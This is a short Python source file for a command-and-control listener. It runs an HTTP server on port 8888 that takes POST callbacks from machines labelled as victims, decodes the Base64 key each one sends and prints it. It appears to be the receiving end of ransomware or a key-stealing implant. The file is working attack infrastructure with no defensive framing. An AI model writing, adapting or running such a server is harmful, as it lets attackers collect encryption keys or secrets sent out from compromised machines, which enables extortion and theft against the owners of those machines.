from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse path and query parameters (e.g., ?id=Victim01)
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        victim_id = query_params.get('id', ['Unknown'])[0]

        # Read the POST body containing the Base64 key
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        print(f"\n[+] Received callback from: {victim_id}")
        print(f"    Raw Base64 Key: {post_data}")
        
        try:
            decoded_key = base64.b64decode(post_data)
            print(f"    Decoded Key (Hex): {decoded_key.hex()}")
        except Exception as e:
            print(f"    [-] Key decoding failed: {e}")

        # Send HTTP 200 OK back to the agent
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    # Suppress default HTTP logging to keep console output clean
    def log_message(self, format, *args):
        return

def run_server(port=8888):
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, C2Handler)
    print(f"[*] C2 Listener active on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down C2 listener.")

if __name__ == "__main__":
    run_server()
